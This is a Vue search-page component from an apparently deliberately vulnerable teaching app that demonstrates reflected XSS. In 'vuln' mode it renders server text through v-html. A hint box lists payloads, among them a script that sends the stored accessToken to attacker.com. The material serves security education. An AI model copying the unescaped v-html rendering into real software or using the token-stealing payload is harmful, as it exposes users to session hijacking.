<template>
  <div class="search-page">
    <div class="container">
      <div class="search-header">
        <h1>搜索文章</h1>
        <el-input
          v-model="query"
          placeholder="输入关键词搜索..."
          size="large"
          clearable
          @keyup.enter="handleSearch">
          <template #append>
            <el-button @click="handleSearch" :icon="Search">搜索</el-button>
          </template>
        </el-input>
      </div>
      
      <!-- XSS 演示落点（L0/L1）：输入通过 URL 传入，VULN 模式直接渲染 -->
      <div v-if="searched" class="search-results">
        <div class="result-message">
          <!-- VULN：v-html 原样渲染，可能执行脚本 -->
          <!-- SECURE：后端已转义，前端用文本渲染 -->
          <div v-if="configStore.xssMode === 'vuln'" v-html="resultMessage"></div>
          <div v-else>{{ resultMessage }}</div>
        </div>
        
        <div v-if="results.length > 0" class="results-grid">
          <article-card v-for="article in results" :key="article.id" :article="article" />
        </div>
        
        <div v-else class="empty-results">
          <el-icon size="64"><DocumentRemove /></el-icon>
          <p>未找到相关文章</p>
        </div>
      </div>
      
      <div v-else class="search-placeholder">
        <el-icon size="100"><Search /></el-icon>
        <p>输入关键词开始搜索</p>
      </div>
      
      <!-- XSS 提示（仅在 VULN 模式展示） -->
      <div class="demo-info card" v-if="configStore.xssMode === 'vuln'">
        <h3>⚠️ XSS 演示提示</h3>
        <p>当前处于 VULN 模式，搜索框存在 XSS 漏洞。尝试输入：</p>
        <code>&lt;script&gt;alert('XSS')&lt;/script&gt;</code>
        <p style="margin-top: 12px;">或窃取凭证：</p>
        <code>&lt;script&gt;fetch('https://attacker.com/log?jwt='+localStorage.getItem('accessToken'))&lt;/script&gt;</code>
      </div>
    </div>
  </div>
</template>

<script setup>
// 搜索页（L0/L1）：演示反射型 XSS 与凭证窃取
import { ref, onMounted } from 'vue';
import { useRoute, useRouter } from 'vue-router';
import { useConfigStore } from '@/stores/config';
import axios from '@/api/axios';
import ArticleCard from '@/components/ArticleCard.vue';
import { Search, DocumentRemove } from '@element-plus/icons-vue';

const route = useRoute();
const router = useRouter();
const configStore = useConfigStore();

const query = ref('');
const searched = ref(false);
const results = ref([]);
const resultMessage = ref('');

const handleSearch = async () => {
  if (!query.value.trim()) return;
  
  router.push({ path: '/search', query: { q: query.value } });
  
  try {
    const response = await axios.get('/search', { params: { q: query.value } });
    
    // 不同模式下，后端返回的提示文案不同（VULN 未转义 / SECURE 已转义）
    resultMessage.value = response.data.message;
    results.value = response.data.items || [];
    searched.value = true;
  } catch (error) {
    console.error('Search failed:', error);
  }
};

onMounted(() => {
  if (route.query.q) {
    query.value = route.query.q;
    handleSearch();
  }
});
</script>

<style scoped>
.search-page {
  padding: var(--spacing-2xl) 0;
  min-height: calc(100vh - 80px);
}

.search-header {
  margin-bottom: var(--spacing-2xl);
}

.search-header h1 {
  font-size: 2.5rem;
  margin-bottom: var(--spacing-lg);
  text-align: center;
  background: linear-gradient(135deg, var(--color-primary), var(--color-accent));
  -webkit-background-clip: text;
  -webkit-text-fill-color: transparent;
  background-clip: text;
}

.result-message {
  font-size: 1.1rem;
  color: var(--color-text-secondary);
  margin-bottom: var(--spacing-xl);
  padding: var(--spacing-md);
  background: var(--color-bg-card);
  border-radius: var(--radius-sm);
  border-left: 4px solid var(--color-primary);
}

.results-grid {
  display: grid;
  grid-template-columns: repeat(auto-fill, minmax(350px, 1fr));
  gap: var(--spacing-lg);
}

.search-placeholder,
.empty-results {
  text-align: center;
  padding: var(--spacing-2xl);
  color: var(--color-text-muted);
}

.search-placeholder :deep(.el-icon),
.empty-results :deep(.el-icon) {
  margin-bottom: var(--spacing-lg);
  opacity: 0.5;
}

.demo-info {
  margin-top: var(--spacing-2xl);
  background: rgba(239, 68, 68, 0.1);
  border: 2px solid rgba(239, 68, 68, 0.3);
}

.demo-info h3 {
  color: #FCA5A5;
  margin-bottom: var(--spacing-md);
}

.demo-info code {
  display: block;
  margin-top: var(--spacing-sm);
  padding: var(--spacing-sm);
  background: var(--color-bg-elevated);
  border-radius: var(--radius-sm);
  font-size: 0.9rem;
  overflow-x: auto;
}

@media (max-width: 768px) {
  .results-grid {
    grid-template-columns: 1fr;
  }
}
</style>
